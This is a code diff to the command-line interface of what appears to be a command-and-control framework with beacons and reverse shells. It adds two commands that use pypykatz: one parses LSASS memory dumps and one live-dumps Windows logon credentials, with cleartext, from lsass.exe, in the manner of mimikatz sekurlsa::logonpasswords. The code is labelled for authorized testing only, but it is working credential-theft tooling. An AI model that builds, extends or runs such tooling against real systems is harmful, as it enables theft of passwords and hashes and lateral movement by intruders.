@@ -395,6 +395,54 @@ def _cmd_rsh_shell(srv, args):
     return 0
 
 
+def _cmd_parse_lsass(srv, args):
+    """Operator-side: parse an LSASS minidump file with pypykatz.
+
+    Independent of any team-server state -- it just needs the .dmp file.
+    Output is a structured JSON envelope: {ok, credentials: [...]} so it
+    can be piped into other tooling.
+    """
+    from ..modules import lsass as _lsass_mod
+    ok, report = _lsass_mod.parse_dump(args.dump)
+    _out({
+        "ok": bool(ok),
+        "dump": os.path.abspath(args.dump),
+        "report": report,
+    })
+    return 0 if ok else 1
+
+
+def _cmd_sekurlsa(srv, args):
+    """Operator-side: live-parse the LOCAL LSASS via pypykatz.
+
+    Runs on the operator's workstation -- needs admin privileges on that
+    box (or psExec to SYSTEM). Independent of any team-server / beacon
+    state.
+    """
+    from ..modules import lsass as _lsass_mod
+    pid = None
+    if args.pid:
+        try:
+            pid = int(args.pid)
+        except ValueError:
+            _out({"ok": False, "error": f"bad --pid: {args.pid}"})
+            return 1
+    pkgs = args.pkgs or "all"
+    ok, report = _lsass_mod.sekurlsa_logonpasswords(
+        packages=pkgs, pid=pid, no_lsa=args.no_lsa)
+    if ok:
+        _out({
+            "ok": True,
+            "pid": pid or "(lsass.exe auto-resolved)",
+            "packages": pkgs.split(","),
+            "report": report,
+        })
+        return 0
+    # Failure: surface the error string in the envelope too.
+    _out({"ok": False, "error": report, "report": ""})
+    return 1
+
+
 def run(argv):
     srv = _load_server()
     p = build_parser()
@@ -410,6 +458,8 @@ def run(argv):
         "reverse-shell": _cmd_reverse_shell,
         "rsh-list": _cmd_rsh_list,
         "rsh-shell": _cmd_rsh_shell,
+        "parse-lsass": _cmd_parse_lsass,
+        "sekurlsa": _cmd_sekurlsa,
     }
     if not args.cmd:
         p.print_help()
@@ -472,6 +522,28 @@ def build_parser():
     pshell.add_argument("session_id")
     pshell.add_argument("--command", default=None,
                         help="send one command and print output (non-interactive)")
+
+    # Operator-side LSASS dump parser (requires pypykatz on operator host).
+    # AUTHORIZED SECURITY TESTING ONLY. Accepts a minidump produced by
+    # 'cscli --task <sid> "lsass <path>"' (or a manually-acquired dump).
+    pls = sub.add_parser("parse-lsass",
+                         help="parse an LSASS minidump with pypykatz (operator side)")
+    pls.add_argument("dump", help="path to lsass.dmp")
+
+    # Operator-side live LSASS parsing (mimikatz sekurlsa::logonpasswords).
+    # AUTHORIZED SECURITY TESTING ONLY. Runs pypykatz against the LOCAL
+    # lsass.exe (Windows; admin required). On a non-Windows host this
+    # surfaces a clear error.
+    psek = sub.add_parser("sekurlsa",
+                          help="live-parse the local LSASS via pypykatz "
+                               "(operator side; Win+admin)")
+    psek.add_argument("--pid", default=None,
+                      help="target PID (default: lsass.exe auto-resolved)")
+    psek.add_argument("--pkgs", default="all",
+                      help="comma-separated SSP packages "
+                           "(msv,wdigest,kerberos,tspkg,ssp,livessp,dpapi,cloudap)")
+    psek.add_argument("--no-lsa", action="store_true",
+                      help="skip LSA decryptor (faster, no cleartext)")
 
     return p
 
